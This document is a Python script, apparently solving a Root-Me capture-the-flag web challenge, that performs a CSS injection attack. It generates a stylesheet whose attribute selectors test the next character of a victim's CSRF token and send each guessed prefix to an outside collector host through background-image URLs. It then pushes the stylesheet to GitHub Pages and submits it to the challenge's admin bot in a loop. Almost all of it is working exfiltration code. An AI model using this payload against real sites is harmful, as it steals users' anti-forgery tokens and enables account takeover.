from time import sleep
import requests
import os
import requests
from requests.adapters import HTTPAdapter

def build_css(chars):
        # supp du file
        os.remove("./a.css")

        # création du new file
        file = open("./a.css", "w") 
        str = '''
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC	"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC	);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC "]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC );}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC!"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC!);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'''+bytearray.fromhex("5C").decode()+'''""]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%22);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC#"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC#);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC$"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC$);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC%"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC&"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC&);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%23);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC("]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%24);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC)"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%25);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC*"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC*);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC+"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC+);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC,"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC,);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC-"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC-);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC."]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC.);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC/"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC/);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC0"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC0);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC1"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC1);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC2"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC2);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC3"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC3);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC4"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC4);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC5"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC5);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC6"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC6);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC7"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC7);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC8"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC8);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC9"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC9);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC:"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC:);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC;"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC;);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC<"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC<);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC="]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC=);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC>"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC>);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC?"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC?);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC@"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC@);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCA);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCB"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCB);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCC"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCC);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCD"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCD);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCE"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCE);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCF"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCF);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCG"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCG);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCH"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCH);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCI"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCI);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCJ"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCJ);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCK"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCK);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCL"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCL);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCM"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCM);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCN"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCN);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCO"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCO);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCP"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCP);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCQ"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCQ);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCR"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCR);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCS"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCS);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCT"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCT);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCU"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCU);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCV"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCV);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCW"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCW);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCX"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCX);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCY"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCY);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCZ"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCZ);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC["]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%27);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'''+bytearray.fromhex("5C").decode()+'''\"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%28);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC]"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%29);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC^"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC^);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC_);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC`"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC`);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCa"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCa);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCb"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCb);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCc"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCc);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCd"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCd);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCe"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCe);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCf"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCf);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCg"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCg);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCh"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCh);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCi"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCi);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCj"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCj);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCk"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCk);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCl"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCl);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCm"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCm);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCn"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCn);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCo"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCo);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCp"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCp);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCq"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCq);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCr"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCr);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCs"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCs);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCt"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCt);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCu"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCu);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCv"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCv);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCw"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCw);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCx"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCx);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCy"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCy);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCz"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSCz);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC{"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%40);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC|"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC|);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC}"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC%41);}
        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC~"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC~);}
        '''
        
        file.write(str) 
        file.close()

# ----
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
know  = "ruW-tjL1BWCdhbiOSCA" 

# envoie à admin 
while 1:
        session = requests.Session()
        # new css
        build_css(know)
        #sleep(1) # for not to ban

        # commit & push
        os.system('git add .')
        os.system('git commit -m "update css"')
        os.system('git push -f')

        # request POST
        sleep(10) # for not to ban
        data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a"}
        r = requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
        print(r.content)
        know += input("new chars to know : ")